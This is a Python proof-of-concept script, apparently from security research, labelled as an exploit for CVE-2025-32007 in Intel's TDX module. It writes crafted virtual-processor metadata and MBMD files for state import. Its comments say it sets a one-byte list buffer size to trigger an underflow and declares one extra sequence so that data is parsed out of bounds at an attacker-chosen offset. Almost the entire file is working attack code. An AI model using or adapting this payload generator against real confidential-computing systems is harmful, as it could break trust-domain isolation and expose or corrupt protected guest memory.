""""""

from argparse import ArgumentParser
from subprocess import CalledProcessError, run

from boxy import Boxy, DataType, Endian, SIZEOF_UINT64
from devo import genbytes, genuint16, genuint32, genuint64, genuint8
from tdxamine import State, TdData
from tdxtend import MIN_VP_STATE_IMPORT_PAGES, CLASS_CODE_SHIFT, CONTEXT_CODE_SHIFT, ELEMENT_SIZE_CODE_SHIFT, IGNORED_SHIFT, INC_SIZE_SHIFT, LAST_ELEMENT_IN_FIELD_SHIFT, LAST_FIELD_IN_SEQUENCE_SHIFT, TdxContextCode, Tdxtend, WRITE_MASK_VALID_SHIFT
from gateway import FOUR_KILOBYTES

def make_field_identifier(
    context_code: int,
    class_code: int,
    field_code: int,
    element_size_code: int,
    last_field_in_sequence: int = 0,
    last_element_in_field: int = 0,
    write_mask_valid: int = 0,
    inc_size: int = 0,
    ignored: int = 0,
) -> int:

  return (
      context_code << CONTEXT_CODE_SHIFT
      | class_code << CLASS_CODE_SHIFT
      | ignored << IGNORED_SHIFT
      | write_mask_valid << WRITE_MASK_VALID_SHIFT
      | inc_size << INC_SIZE_SHIFT
      | element_size_code << ELEMENT_SIZE_CODE_SHIFT
      | last_field_in_sequence << LAST_FIELD_IN_SEQUENCE_SHIFT
      | last_element_in_field << LAST_ELEMENT_IN_FIELD_SHIFT
      | field_code
  )


def make_md_sequence(field_id: int, elements: list[int]) -> Boxy:

  md_sequence = Boxy("struct md_sequence", endian=Endian.LITTLE)
  md_sequence.addfield(
      "sequence_header", DataType.UINT64, genuint64(value=field_id)
  )

  for i in range(len(elements)):
    md_sequence.addfield(
        f"element {i}", DataType.UINT64, genuint64(value=elements[i])
    )

  return md_sequence


def make_md_list(
    list_buff_size: int, num_sequences: int, sequences: list[Boxy]
) -> Boxy:

  md_list = Boxy("struct md_list", endian=Endian.LITTLE)

  md_list.addfield(
      "list_buff_size", DataType.UINT16, genuint16(value=list_buff_size)
  )
  md_list.addfield(
      "num_sequences", DataType.UINT16, genuint16(value=num_sequences)
  )
  md_list.addfield("reserved", DataType.UINT32, genuint32(value=0))

  for i in range(len(sequences)):
    sequence = sequences[i].encode()
    md_list.addfield(
        f"sequence {i}", DataType.BYTES, genbytes(len(sequence), value=sequence)
    )

  return md_list


def main():

  melllvar_logo = """
  melllvar: CVE-2025-32007 
  - Behold, a power that is different from the one you saw earlier!
  """

  print(melllvar_logo)

  parser = ArgumentParser(
      prog="melllvar",
      description=(
          "Behold, a power that is different from the one you saw earlier!"
      ),
  )

  parser.add_argument("offset", type=int, help="Out of bounds offset")

  parser.add_argument("vp_data", type=str, help="Output data file")

  parser.add_argument(
      "vp_mbmd",
      type=str,
      help="Output mbmd file",
  )

  parser.add_argument(
      "--state",
      type=str,
      default="state.pickle",
      help="State to load",
  )

  args = parser.parse_args()

  sequences = []

  field_id = 0x24020100000800  # Guest ES selector
  elements = [0x0, 0x10, 0x18, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24000100000814  # Guest UINV
  elements = [0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24000300002034  # Tertiary Processor-Based VM-Exection Controls
  elements = [0x20]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2400430000204A  # IA32_SPEC_CTRL mask
  elements = [0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2401C300002802  # IA32_DEBUGCTL
  elements = [
      0x4,
      0x407050600070106,
      0xD01,
      0x700000000,
      0x75138001,
      0x75138001,
      0x75138001,
      0x75138001,
  ]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24008300002814  # IA32_RTIT_CTL
  elements = [0x0, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24010200004000  # Pin-Based VM-Exection Controls
  elements = [0xBF, 0xB5226DFA, 0x40000, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2400020000400C  # VM-Exit Controls
  elements = [0x1F3FFFFF]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24000200004012  # VM-Entry Controls
  elements = [0x3EF3FF]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24008200004016  # VM-entry interruption information
  elements = [0x314, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2400C20000401E  # Secondary Processor-Based VM-Exection Controls
  elements = [0x73CB3FA, 0x0, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2404C200004800  #  Guest ES limit
  elements = [
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0xFFFFFFFF,
      0x4087,
      0x7F,
      0xFFF,
      0x1C00,
      0xA09B,
      0xC093,
      0x1C000,
      0x1C000,
      0x1C000,
      0x1C000,
      0x8B,
      0x0,
      0x0,
  ]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2400020000482A  # IA32_SYSENTER_CS
  elements = [0x10]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x2400020000482E  # VMX-Preemption Timer Value
  elements = [0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24000300006006  # CR4 Read Shadow
  elements = [0x40]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x24058300006800  # Guest CR0
  elements = [
      0x80050033,
      0x72B0E001,
      0x771EF0,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0xFF36D9F17D200000,
      0x0,
      0xFFFFFE507C831000,
      0xFFFFFE507C82F000,
      0xFFFFFE0000000000,
      0x400,
      0xFFFFFFFFB5A03D18,
      0xFFFFFFFFB46CB3E8,
      0x46,
      0x0,
      0xFFFFFE507C831000,
      0xFFFFFFFFB4801920,
      0x0,
      0x0,
      0x0,
  ]
  sequences.append(make_md_sequence(field_id, elements))

  for i in range(119):
    # 0x120000300000000 VAPIC
    field_id = make_field_identifier(
        context_code=TdxContextCode.MD_CTX_VP.value,
        class_code=1,
        field_code=i,
        element_size_code=3,
        last_field_in_sequence=0,
        last_element_in_field=0,
        write_mask_valid=1,
        inc_size=0,
        ignored=0,
    )
    elements = [0xFFFFFFFFFFFFFFFF, 0x0]
    sequences.append(make_md_sequence(field_id, elements))

  # 0x120000300000077 VAPIC
  field_id = make_field_identifier(
      context_code=TdxContextCode.MD_CTX_VP.value,
      class_code=1,
      field_code=119,
      element_size_code=3,
      last_field_in_sequence=8,
      last_element_in_field=0,
      write_mask_valid=0,
      inc_size=0,
      ignored=0,
  )
  elements = [0x0] * 9
  sequences.append(make_md_sequence(field_id, elements))

  # field_id = 0x1201fc300000000
  # elements = [0] * 128
  # elements[16] = 0x10
  # elements[20] = 0x10
  # sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x220004200000000  # EXIT_REASON
  elements = [0x20, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x220008300000002  # EXIT_QUALIFICATION
  elements = [0x0, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x220000100000005  # EPTP_INDEX
  elements = [0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x8220004200000010  # INSTRUCTION_LENGTH
  elements = [0x2, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x8220000000000013  # VE_CATEGORY
  elements = [0x10]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x102003C300000000  # RAX
  elements = [
      0x0,
      0xFFCC,
      0x0,
      0x0,
      0x0,
      0xFFFFFFFFB5A03D48,
      0x0,
      0x0,
      0x0,
      0x0,
      0x0,
      0xC,
      0x0,
      0x0,
      0x0,
      0x0,
  ]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x112000C300000000  # DR0
  elements = [0x0, 0x0, 0x0, 0x0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x1120000300000006  # DR6
  elements = [0xFFFE07F0]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x1120000300000020  # XCR0
  elements = [0x602E7]
  sequences.append(make_md_sequence(field_id, elements))

  field_id = 0x1120000300000028  # CR2
  elements = [0x58C3E931E7B8]
  sequences.append(make_md_sequence(field_id, elements))

  # 0x1220004300000000 XBUFF
  field_id = make_field_identifier(
      context_code=TdxContextCode.MD_CTX_VP.value,
      class_code=18,
      field_code=0,
      element_size_code=3,
      last_field_in_sequence=args.offset,
      last_element_in_field=0,
      # write_mask_valid=0,
      write_mask_valid=1,
      inc_size=0,
      ignored=0,
  )

  # field_id = 0x12203B8300000000
  elements = [0xFFFFFFFFFFFFFFFF]
  sequences.append(make_md_sequence(field_id, elements))

  # list_buff_size = 1 to trigger the underflow
  # num_sequences = len(sequences) + 1 to parse a sequence out of bounds
  md_list = make_md_list(1, len(sequences) + 1, sequences)

  with open(args.vp_data, "wb") as f:
    f.write(md_list.encode())
    f.write(b"\x00" * ((MIN_VP_STATE_IMPORT_PAGES - 1) * FOUR_KILOBYTES))

  mbmd = Boxy("struct mbmd", endian=Endian.LITTLE)

  mbmd.addfield("size", DataType.UINT16, genuint16(value=48))
  mbmd.addfield("mig_version", DataType.UINT16, genuint16(value=0))
  mbmd.addfield("migs_index", DataType.UINT16, genuint16(value=0))
  mbmd.addfield(
      "mb_type", DataType.UINT8, genuint8(value=TdxContextCode.MD_CTX_VP.value)
  )
  mbmd.addfield("reserved_1", DataType.UINT8, genuint8(value=0))
  mbmd.addfield("mb_counter", DataType.UINT32, genuint32(value=2))
  mbmd.addfield("mig_epoch", DataType.UINT32, genuint32(value=0))
  mbmd.addfield("iv_counter", DataType.UINT64, genuint64(value=4))
  mbmd.addfield("vp_index", DataType.UINT64, genuint64(value=0))
  mbmd.addfield("mac", DataType.BYTES, genbytes(16, value=b"\x00" * 16))

  with open(args.vp_mbmd, "wb") as f:
    f.write(mbmd.encode())

if __name__ == "__main__":
  main()
